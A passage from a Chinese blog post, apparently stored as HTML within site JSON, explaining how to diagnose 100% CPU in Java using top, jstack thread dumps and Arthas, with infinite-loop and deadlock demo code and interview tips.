class=\"line\">JNI global references: 15  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>你会发现上面的信息其实是一段一段的，摘取其中的一段为大家说明:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;main&quot; #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  </span><br><span class=\"line\">        at java.lang.Thread.sleep(Native Method)  </span><br><span class=\"line\">        at com.jvm.JVMtest.main(JVMtest.java:6)  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>main</code>:线程名称</p>\n<p><code>#1</code>:当前线程ID，从main开始，jvm会根据线程创建的顺序为其线程编号</p>\n<p><code>prio</code>:优先级的顺序，一般默认是5</p>\n<p><code>os_prio</code>:线程对应系统的优先级</p>\n<p><code>tid</code>:java内的线程id</p>\n<p><code>nid</code>:操作系统级别的线程id，是一个十六进制</p>\n<p>关于线程的信息:</p>\n<p><code>NEW</code>:线程新建，还没开始运行</p>\n<p><code>RUNNABLE</code>:正在java虚拟机中运行的线程</p>\n<p><code>BLOCKED</code> :被阻塞，正在等待监视器锁的线程</p>\n<p><code>WAITING</code> :无限期等待另一个线程执行特定操作的线程</p>\n<p><code>TIMED_WAITING</code>:等待另一个线程执行操作达到指定等待时间的线程</p>\n<p><code>TERMINATED</code>:已经退出的线程</p>\n<p>我们这里关注的最多的就是<code>nid</code></p>\n<h3 id=\"4-2-使用jstack解决CPU占用很高的问题并定位具体行数\"><a href=\"#4-2-使用jstack解决CPU占用很高的问题并定位具体行数\" class=\"headerlink\" title=\"4.2.使用jstack解决CPU占用很高的问题并定位具体行数\"></a>4.2.使用jstack解决CPU占用很高的问题并定位具体行数</h3><p>先来看一段代码:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">package com.jvm;  </span><br><span class=\"line\">  </span><br><span class=\"line\">import java.util.concurrent.ExecutorService;  </span><br><span class=\"line\">import java.util.concurrent.Executors;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public class JVMCPU &#123;  </span><br><span class=\"line\">    private static ExecutorService service = Executors.newFixedThreadPool(5);  </span><br><span class=\"line\">    private static Object lock = new Object();  </span><br><span class=\"line\">    public static class yupengTask implements Runnable&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        @Override  </span><br><span class=\"line\">        public void run() &#123;  </span><br><span class=\"line\">            synchronized (lock)&#123;  </span><br><span class=\"line\">                long sum = 0L;  </span><br><span class=\"line\">                while(true)&#123;  </span><br><span class=\"line\">                    sum +=1;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        yupengTask yupengTask = new yupengTask();  </span><br><span class=\"line\">        service.execute(yupengTask);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将这段代码上传到linux服务器，并且使用<code>nohup java JVMCPU &amp;</code>运行</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/8.png\"><br>使用<code>top</code>命令可以看到cpu被打满了</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/9.png\"><br>知道了进程的PID，如何找到进程下是哪个线程呢?可以使用命令<code>top -Hp 26964</code>，如下所示</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/10.png\"><br>从上面的图可以看到，cpu占用最多的线程是26976这个线程id，接下来就是使用<code>jstack</code>命令来查看程序的所有堆栈信息，但是，这里需要有一个注意的点，26876这个是一个十进制</p>\n<p>的，使用jstack看到的nid是十六进制，所以我们需要转换，可以使用<code>printf &quot;%x\\n&quot;</code>这个命令</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/11.png\"><br>接下来使用<code>jstack -l 26964</code>打印堆栈信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2024\\-06\\-08 12:17:36  </span><br><span class=\"line\">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.281\\-b09 mixed mode):  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Attach Listener&quot; #10 daemon prio=9 os\\_prio=0 tid=0x00007f006c001000 nid=0xc7f waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;DestroyJavaVM&quot; #9 prio=5 os\\_prio=0 tid=0x00007f00a0009800 nid=0x6955 waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;pool-1-thread-1&quot; #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f59dfcf0\\&gt; (a java.lang.Object)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  </span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:748)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- &lt;0x00000000f59e0ed0\\&gt; (a java.util.concurrent.ThreadPoolExecutor$Worker)  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Service Thread&quot; #7 daemon prio=9 os\\_prio=0 tid=0x00007f00a00d4800 nid=0x695e runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C1 CompilerThread1&quot; #6 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b9800 nid=0x695d waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C2 CompilerThread0&quot; #5 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b6800 nid=0x695c waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b5000 nid=0x695b runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Finalizer&quot; #3 daemon prio=8 os\\_prio=0 tid=0x00007f00a0082000 nid=0x695a in Object.wait() \\[0x00007f008b6f5000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">\tat java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">\t- waiting on &lt;0x00000000f5988ee0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f5988ee0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  </span><br><span class=\"line\">\tat java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Reference Handler&quot; #2 daemon prio=10 os\\_prio=0 tid=0x00007f00a007d800 nid=0x6959 in Object.wait() \\[0x00007f008b7f6000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">\tat java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">\t- waiting on &lt;0x00000000f5986c00\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">\tat java.lang.Object.wait(Object.java:502)  </span><br><span class=\"line\">\tat java.lang.ref.Reference.tryHandlePending(Reference.java:191)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f5986c00\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">\tat java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Thread&quot; os\\_prio=0 tid=0x00007f00a0074000 nid=0x6958 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#0 (ParallelGC)&quot; os\\_prio=0 tid=0x00007f00a001e800 nid=0x6956 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#1 (ParallelGC)&quot; os\\_prio=0 tid=0x00007f00a0020800 nid=0x6957 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Periodic Task Thread&quot; os\\_prio=0 tid=0x00007f00a00d7800 nid=0x695f waiting on condition   </span><br><span class=\"line\">  </span><br><span class=\"line\">JNI global references: 5  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>从上面的信息中，可以看到转换的结果和nid是一致的，</p>\n<p>从下面的信息中就可以看到问题其实是出现在<code>JVMCPU.java</code>的14行左右，这里给出的是14行，但是实际情况是14行的附近</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;pool-1-thread-1&quot; #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f59dfcf0\\&gt; (a java.lang.Object)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  </span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:748)  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结合代码来看一下就很容易问题</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/12.png\"></p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h2 id=\"5-使用arthas解决CPU占用很高的问题，定位具体代码行\"><a href=\"#5-使用arthas解决CPU占用很高的问题，定位具体代码行\" class=\"headerlink\" title=\"5.使用arthas解决CPU占用很高的问题，定位具体代码行\"></a>5.使用arthas解决CPU占用很高的问题，定位具体代码行</h2><p>使用arthas解决CPU 100%问题，在方法论上要用到两个命令，</p>\n<ul>\n<li><p>dashboard 命令查看TOP N线程，</p>\n</li>\n<li><p>thread 命令查看堆栈信息</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/13.png\"><br>先来运行<code>arthas</code></p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/14.png\"><br>输入1显示如下</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/15.png\"><br>输入<code>dashboard</code>命令可以看到是哪个线程占用cpu最高</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/16.png\"><br>接下来输入<code>thread -n 3</code>，表示最忙的前3个线程并打印信息</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/17.png\"><br>从上面的图中可以看到arthas和jstack展示的信息差不多，都定位到了<code>JVMCPU.java</code>的14行程序</p>\n<h2 id=\"6-死锁导致CPU占用很高的问题分析\"><a href=\"#6-死锁导致CPU占用很高的问题分析\" class=\"headerlink\" title=\"6.死锁导致CPU占用很高的问题分析\"></a>6.死锁导致CPU占用很高的问题分析</h2><p>先来看一段代码:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class DeadlockDemo &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    // 创建两个锁对象  </span><br><span class=\"line\">    private static final Object lock1 = new Object();  </span><br><span class=\"line\">    private static final Object lock2 = new Object();  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 线程1尝试获取lock1，然后获取lock2  </span><br><span class=\"line\">        Thread thread1 = new Thread(() -&gt; &#123;  </span><br><span class=\"line\">            synchronized (lock1) &#123;  </span><br><span class=\"line\">                System.out.println(&quot;Thread 1: Holding lock 1...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                try &#123; Thread.sleep(100); &#125;   </span><br><span class=\"line\">                catch (InterruptedException e) &#123;&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">                System.out.println(&quot;Thread 1: Waiting for lock 2...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                synchronized (lock2) &#123;  </span><br><span class=\"line\">                    System.out.println(&quot;Thread 1: Holding lock 1 &amp; 2...&quot;);  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 线程2尝试获取lock2，然后获取lock1  </span><br><span class=\"line\">        Thread thread2 = new Thread(() -&gt; &#123;  </span><br><span class=\"line\">            synchronized (lock2) &#123;  </span><br><span class=\"line\">                System.out.println(&quot;Thread 2: Holding lock 2...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                try &#123; Thread.sleep(100); &#125;   </span><br><span class=\"line\">                catch (InterruptedException e) &#123;&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">                System.out.println(&quot;Thread 2: Waiting for lock 1...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                synchronized (lock1) &#123;  </span><br><span class=\"line\">                    System.out.println(&quot;Thread 2: Holding lock 2 &amp; 1...&quot;);  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        thread1.start();  </span><br><span class=\"line\">        thread2.start();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将上面的代码上传到服务器，使用<code>nohuo java DeadlockDemo &amp;</code>运行起来</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/18.png\"><br>接下来使用arthas进行分析</p>\n<blockquote>\n<p>这里选择arthas，不选择jstack是因为arthas更加的方便，它的功能也比jstack丰富</p>\n</blockquote>\n<p>输入thread就可以输出线程的统计信息，其中BLOCKED代表当前阻塞的线程数</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/19.png\"><br>接下来，输入<code>thread -b</code>就可以看到线程具体的情况，在下面的图中已经准确的说明了代码在哪一行</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/20.png\"></p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h2 id=\"7-小提示\"><a href=\"#7-小提示\" class=\"headerlink\" title=\"7.小提示\"></a>7.小提示</h2><p>工具的选择建议使用arthas，它还有很多的功能在实际中很有用</p>\n<p>大家在面试的时候如果遇到cpu被打满该如何排查这样的问题，不要上来就是使用arthas来定位问题，我们的第一反应永远都是回滚版本，</p>\n<p>因为在实际中代码的问题需要分析，不会像举例子这么简单，代码经过分析改动再上线，会浪费很多时间，而有的业务是绝对不允许这么操作的，比如电商，金融的业务，</p>\n<p>所以在回答面试官的问题时候一定要先说回滚，在说解决办法.</p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<h2 id=\"1-cpu占用很高的3大类型，9大场景\"><a href=\"#1-cpu占用很高的3大类型，9大场景\" class=\"headerlink\" title=\"1.cpu占用很高的3大类型，9大场景:\"></a>1.cpu占用很高的3大类型，9大场景:</h2><p>CPU 飙升是一个常见的问题。</p>\n<p>在生产环境中，会出现由代码问题导致CPU占用很高，该如何诊断出是哪行java代码导致? 是大家的一项重要基本功，也是大家面试中的家常骗饭。</p>\n<p>如果连CPU 飙升的问题都回答不清楚， 都支支吾吾， 面试就很难通过了</p>\n<p>下面，用20多年的技术内功洪荒之力，给大家梳理一下 cpu占用很高的三大类型问题，9大问题场景。</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/1.png\"></p>\n<h3 id=\"第1大类型导致CPU100-的问题：-业务类问题\"><a href=\"#第1大类型导致CPU100-的问题：-业务类问题\" class=\"headerlink\" title=\"第1大类型导致CPU100%的问题： 业务类问题\"></a>第1大类型导致CPU100%的问题： 业务类问题</h3><p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/2.png\"></p>\n<h4 id=\"1-1-死循环\"><a href=\"#1-1-死循环\" class=\"headerlink\" title=\"1.1 死循环\"></a>1.1 死循环</h4><blockquote>\n<p>while(true)条件</p>\n</blockquote>\n<p>导致 CPU 占用率高的最简单但最具破坏性的编程错误之一就是死循环。</p>\n<p>当程序中的循环缺乏正确的退出条件或条件从未满足时，就会出现这种情况，</p>\n<p>死循环无休止地运行，消耗过多的处理器时间，导致CPU100%</p>\n<h4 id=\"1-2-死锁\"><a href=\"#1-2-死锁\" class=\"headerlink\" title=\"1.2 死锁\"></a>1.2 死锁</h4><p>发生死锁后，就会存在忙等待或自旋锁等编程问题，从而导致 繁忙等待问题。</p>\n<p>即进程在不释放 CPU 的情况下反复检查条件是否满足，会导致 CPU 占用率居高不下。</p>\n<p>这种低效率的资源使用会妨碍 CPU 执行其他任务。</p>\n<h4 id=\"1-3-不必要的代码块\"><a href=\"#1-3-不必要的代码块\" class=\"headerlink\" title=\"1.3 不必要的代码块\"></a>1.3 不必要的代码块</h4><p>在不需要的地方使用<code>synchronized</code>块，会导致线程竞争和上下文切换</p>\n<p>解决方案:尽量减少同步块的使用范围</p>\n<h3 id=\"第2大类型导致CPU100-的问题：并发类问题\"><a href=\"#第2大类型导致CPU100-的问题：并发类问题\" class=\"headerlink\" title=\"第2大类型导致CPU100%的问题：并发类问题\"></a>第2大类型导致CPU100%的问题：并发类问题</h3><p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/3.png\"></p>\n<h4 id=\"1-4-大量计算密集型的任务\"><a href=\"#1-4-大量计算密集型的任务\" class=\"headerlink\" title=\"1.4 大量计算密集型的任务\"></a>1.4 大量计算密集型的任务</h4><p>比如复杂的数学计算，图像处理，视频编码</p>\n<p>计算密集型的任务需要大量的计算能力。在没有足够系统资源的情况下运行这些应用程序，可能会导致 CPU 占用率达到 100%，因为它们试图执行高要求的任务。</p>\n<p>解决方案:优化算法，使用更高效的库，或者利用并行计算来分摊</p>\n<h4 id=\"1-5-大量并发线程\"><a href=\"#1-5-大量并发线程\" class=\"headerlink\" title=\"1.5 大量并发线程\"></a>1.5 大量并发线程</h4><p>多个线程同时运行会导致对 CPU 资源的竞争，尤其是当其中许多线程都是资源密集型进程时。</p>\n<p>这会导致所有线程获得的 CPU 时间减少，当每个线程都试图完成自己的任务时，CPU 时间可能会被耗尽。</p>\n<h4 id=\"1-6-大量的上下文切换\"><a href=\"#1-6-大量的上下文切换\" class=\"headerlink\" title=\"1.6 大量的上下文切换\"></a>1.6 大量的上下文切换</h4><p>创建过多的线程，导致频繁的上下文切换</p>\n<p>解决方案:使用线程池来管理线程的数量</p>\n<h3 id=\"第3大类导致CPU100-的问题：内存类问题\"><a href=\"#第3大类导致CPU100-的问题：内存类问题\" class=\"headerlink\" title=\"第3大类导致CPU100%的问题：内存类问题\"></a>第3大类导致CPU100%的问题：内存类问题</h3><p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/4.png\"></p>\n<h4 id=\"1-7-内存不足\"><a href=\"#1-7-内存不足\" class=\"headerlink\" title=\"1.7 内存不足\"></a>1.7 内存不足</h4><p>当系统内存不足时，就会将磁盘存储作为虚拟内存使用，而虚拟内存的运行速度要慢得多。</p>\n<p>这种<strong>过度的分页和交换</strong>会导致 CPU 占用率居高不下，因为处理器需要花费更多时间来管理内存访问，而不是高效地执行进程。</p>\n<h4 id=\"1-8-频繁GC\"><a href=\"#1-8-频繁GC\" class=\"headerlink\" title=\"1.8 频繁GC\"></a>1.8 频繁GC</h4><p>创建大量的短生命周期的对象，频繁触发GC</p>\n<p>解决方案: 优化代码， 减少对象的创建 ，或者调整JVM的参数来优化</p>\n<h4 id=\"1-9-内存泄漏\"><a href=\"#1-9-内存泄漏\" class=\"headerlink\" title=\"1.9 内存泄漏\"></a>1.9 内存泄漏</h4><p>程序持续分配内存但不释放，会导致频繁的GC</p>\n<p>解决方案:使用内存分析工具VisualVM进行检测和修复</p>\n<h2 id=\"2-CPU100-定位的两大神器\"><a href=\"#2-CPU100-定位的两大神器\" class=\"headerlink\" title=\"2.CPU100%定位的两大神器:\"></a>2.CPU100%定位的两大神器:</h2><p>想要定位到具体是哪一行的代码导致， 一般都会使用下面的两大神器</p>\n<ul>\n<li><p>通常使用的jvm自带的工具jstack，</p>\n</li>\n<li><p>还有一种就是开源神器arthas，</p>\n</li>\n</ul>\n<p>一般而言，arthas还有其它的功能，所以选择它多一点.</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/5.png\"><br>在后面的讲解中，</p>\n<p>会首先讲解jstack， 使用jstack来解决实际遇到的问题，</p>\n<p>然后在使用第二大神器 arthas来解决相同的问题，</p>\n<p>大家可以在这两个工具使用过程中选择自己比较顺手的， 这里推荐 arthas， 关于arthas的细致学习，请参考的《arthas 学习圣经》 PDF。</p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h2 id=\"3-CPU-飙升100-的解决思路与方法论\"><a href=\"#3-CPU-飙升100-的解决思路与方法论\" class=\"headerlink\" title=\"3 CPU 飙升100%的解决思路与方法论\"></a>3 CPU 飙升100%的解决思路与方法论</h2><h2 id=\"4-使用jstack-解决CPU-100-问题实操\"><a href=\"#4-使用jstack-解决CPU-100-问题实操\" class=\"headerlink\" title=\"4 使用jstack 解决CPU 100%问题实操\"></a><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/6.png\"><br>4 使用jstack 解决CPU 100%问题实操</h2><p>使用jstack 解决CPU 100%问题，在方法论上要用到两个命令，</p>\n<ul>\n<li><p>top 命令查看TOP N线程，</p>\n</li>\n<li><p>jstack命令查看堆栈信息</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/7.png\"></p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h3 id=\"4-1-jstack命令讲解\"><a href=\"#4-1-jstack命令讲解\" class=\"headerlink\" title=\"4.1.jstack命令讲解\"></a>4.1.jstack命令讲解</h3><p>命令jstack是java堆栈的跟踪工具，可以打印出程序中所有线程的堆栈信息，包括线程状态，调用栈信息，锁信息等。</p>\n<p>jstack可以诊断线程死锁、内存泄漏等问题</p>\n<p>命令格式: jstack [options] pid</p>\n<blockquote>\n<p>常用例子: jstack -l pid，查看线程的堆栈信息</p>\n</blockquote>\n<p>堆栈信息解读:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">yupengdembp:TestYupeng yupeng$ jstack -l 43953  </span><br><span class=\"line\">2024\\-06\\-08 10:14:45  </span><br><span class=\"line\">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.191\\-b12 mixed mode):  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Attach Listener&quot; #10 daemon prio=9 os\\_prio=31 tid=0x00007fb54485a000 nid=0x3503 waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Service Thread&quot; #9 daemon prio=9 os\\_prio=31 tid=0x00007fb5430b4000 nid=0x3203 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C1 CompilerThread2&quot; #8 daemon prio=9 os\\_prio=31 tid=0x00007fb54407e800 nid=0x3103 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C2 CompilerThread1&quot; #7 daemon prio=9 os\\_prio=31 tid=0x00007fb54400f800 nid=0x4203 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C2 CompilerThread0&quot; #6 daemon prio=9 os\\_prio=31 tid=0x00007fb54285a000 nid=0x4403 waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Monitor Ctrl-Break&quot; #5 daemon prio=5 os\\_prio=31 tid=0x00007fb5430ab000 nid=0x4503 runnable \\[0x0000700002427000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">        at java.net.SocketInputStream.socketRead0(Native Method)  </span><br><span class=\"line\">        at java.net.SocketInputStream.socketRead(SocketInputStream.java:116)  </span><br><span class=\"line\">        at java.net.SocketInputStream.read(SocketInputStream.java:171)  </span><br><span class=\"line\">        at java.net.SocketInputStream.read(SocketInputStream.java:141)  </span><br><span 